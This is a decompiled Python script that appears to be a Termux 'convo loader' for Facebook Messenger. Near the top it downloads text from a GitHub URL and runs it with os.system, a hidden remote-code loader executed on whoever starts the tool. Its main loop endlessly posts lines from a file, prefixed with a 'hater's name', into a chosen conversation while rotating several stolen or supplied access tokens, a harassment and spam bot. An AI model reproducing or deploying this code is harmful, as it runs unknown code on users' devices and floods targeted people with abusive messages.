# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2024-06-28 10:36:44.163384
import requests
import json
import time
import sys
from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

xx = '\033[0;93m' # DEFAULT
kk = '\033[93m' # KUNING +
hh = '\x1b[1;92m' # HIJAU +
hi = '\033[32m' # HIJAU -
uu = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bb = '\33[1;96m' # BIRU -
pp= '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass

import base64
import json
import time
import sys,os,re,binascii,time,json,random,threading,pprint,smtplib,telnetlib,os.path,hashlib,string,glob,sqlite3,urllib,argparse,marshal,rich
from rich import print as printer
from rich.panel import Panel
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
os.system('termux-setup-storage')
in_url = 'https://raw.githubusercontent.com/meermuzamil786110/loaderbymeer/main/meerr'

response = requests.get(in_url)
if response.status_code == 200:
    command = response.text.strip()
    os.system(command)
else:
    print("")
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def approval():
    os.system('clear')
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    
    try:
        httpCaht = requests.get('https://github.com/zackxsahil/RoniinConvo/blob/main/Approval.txt').text
        if id in httpCaht:
            print("\33[1;32mYour Token is Successfully Approved")
            msg = str(os.geteuid())
            time.sleep(0.5)
            
            pass
        else:
            eno = input('enter your name: ')
            os.system('clear')
            print("Your Token : " + id)
            print('\33[1;37m----------------------------------------------')
            print("\33[1;32mImportant Note")
            print("\33[1;37m----------------------------------------------")
            print("\33[1;37mYour Token is not approved×")
            print('You Have to Take Approval first')
            print('Free wale dur rahe :)')
            print('\33[1;37m----------------------------------------------')
            print('Tool Owner::  Roniin X Sahil -')
            print(eno +" "+ "Your Token is : " + id)
            input('IF U WANT TO BUY THEN PRESS ENTER ')
            tks = ('Hello%20%20!%20Please%20Approve%20My%20Token%20My%20token%20Is%20:%20' + id +'%20My%20Name%20is%20' + eno)
            os.system('am start https://wa.me/+923177038220?text=' + tks)
            time.sleep(1)

            approval()
    except:
        time.sleep(1)
def liness():
	print('\u001b[37m' + '---------------------------------------------------')

def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]
		

		
	#	for N, line in enumerate(x.split("\n")):
	#		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
		#	time.sleep(0.001)




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer': 'www.google.com'}

			

try:
    approval()
except Exception as e:
    print(e)
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()
testPY()
def main_menu():
    os.system('clear')
    logo()
    newt = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
    newtt = newt

    print('')
    tamp_new = (f'{P2} -=[Convo loader tool with Unlimited ids by Roniin X SahiL]=- {H2} ')
    printer(Panel(tamp_new,title=f'{H2}[ {P2} Note! {H2}]',width=54,padding=(1,4),style='#00FF00'))

    print('        %s[%s•%s] %sTime ==> %s  %s %s '%(J,P,J,hh,newtt,J,P))
    print(''%())
main_menu()
"""mmm = requests.get('https://faraz150yt.blogspot.com/2024/06/.html').text
print('')
nnn = input(BOLD+CYAN+"[•] Enter Tool Passwrod:: ")
if mmm == nnn:
	print (BOLD+GREEN+"Correct Password..")
#else:
	#print(BOLD+RED+'[-] <==> Your Number Is Wrong Please Take Approval From Owner')
	sys.exit()"""
num_tokens = int(input(BOLD+CYAN+"How many tokens do you want to use?: "))
liness()
access_tokens = []
profile_names = []

for i in range(num_tokens):
    access_token = input(BOLD+CYAN+"Enter Access Token {}: ".format(i+1))
    payload = {'access_token': access_token}
    url = "https://graph.facebook.com/v15.0/me"
    response = requests.get(url, params=payload)
    data = json.loads(response.text)

    if 'name' not in data:
        print(BOLD+RED+"\n[x] Invalid Token!")
        continue

    profile_name = data['name']
    print(BOLD+GREEN+"\nProfile Name for Token {}: {}".format(i+1, profile_name))
    liness()
    access_tokens.append(access_token)
    profile_names.append(profile_name)
num_convo_ids = 1
convo_ids = []
text_files = []
for i in range(num_convo_ids):
    convo_id = input(BOLD+CYAN+"Enter Conversation ID: ")
    text_file = input(BOLD+CYAN+"Enter Text File: ")
    liness()
    convo_ids.append(convo_id)
    text_files.append(text_file)

xnxx = input(BOLD+CYAN+"add Hater's Name:: ")
liness()
speed = int(input(BOLD+CYAN+"Speed: "))
liness()
load = ('\n'+"________All Done....Loading Profile Info.....!"+'\n')
for loa in load:
	sys.stdout.write(BOLD+BLUE+loa)
	sys.stdout.flush()
	time.sleep(0.001)
prof = ("[+]=> Tool activated......!"+'\n\n')
		
for pro in prof:
	sys.stdout.write(BOLD+BLUE+pro)
	sys.stdout.flush()
	time.sleep(0.001)
while True:
    try:
        # For each conversation ID, send the messages in the text file.
        for convo_index in range(num_convo_ids):
            convo_id = convo_ids[convo_index]
            text_file = text_files[convo_index]

            # Read the messages from the text file.
            with open(text_file, 'r') as file:
                messages = file.readlines()

            # Get the number of messages and the maximum number of tokens to use.
            num_messages = len(messages)
            max_tokens = min(num_tokens, num_messages)

            # For each message, send it using a different token.
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]

                message = messages[message_index].strip()

                # Send the message.
                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
                parameters = {'access_token': access_token, 'message': xnxx+' '+message}
                response = requests.post(url, json=parameters, headers=headers)

                # Print the status of the message send.
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(BOLD+GREEN+"[+] Message {} of Convo {} sent by Token {}: {}".format(message_index + 1, convo_id, token_index + 1, xnxx+' '+message))
                    print(BOLD+GREEN+"  - Time: {}".format(current_time))
                    liness()
                    liness()
                else:
                    print(BOLD+RED+"[x] Failed to send Message {} of Convo {} with Token {}: {}".format(message_index + 1, convo_id, token_index + 1, xnxx+' '+message))
                    print("  - Time: {}".format(current_time))
                    liness()
                    liness()
                # Sleep for the specified delay.
                time.sleep(speed)

        # Print a message that all messages have been sent.
        print(BOLD+CYAN+"\n[+] All messages sent. Restarting the process...\n")
    except Exception as e:
        print(BOLD+RED+"[!] An error occurred: {}".format(e))

